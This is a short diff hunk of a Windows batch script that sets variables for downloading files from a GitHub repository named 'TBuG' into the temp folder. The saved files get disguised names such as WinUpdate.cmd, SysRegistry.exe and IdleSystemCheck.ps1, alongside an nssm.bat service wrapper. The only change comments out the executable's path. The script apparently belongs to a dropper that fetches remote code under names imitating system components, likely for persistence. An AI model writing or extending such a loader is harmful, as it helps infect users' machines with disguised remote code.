@@ -32,7 +32,7 @@ set "PS1.2_URL=https://raw.githubusercontent.com/Drakovthe6th/TBuG/refs/heads/ma
 rem set "EXE_URL=https://github.com/Drakovthe6th/TBuG/raw/master/Advance.exe"
 set "PS1.3_URL=https://raw.githubusercontent.com/Drakovthe6th/TBuG/refs/heads/master/nssm.bat"
 set "PS1_FILE=%temp%\WinUpdate.cmd"
-set "EXE_FILE=%temp%\SysRegistry.exe"
+rem set "EXE_FILE=%temp%\SysRegistry.exe"
 set "PS1.2_FILE=%temp%\IdleSystemCheck.ps1"
 set "PS1.3_FILE=%temp%\nssm.bat"
 
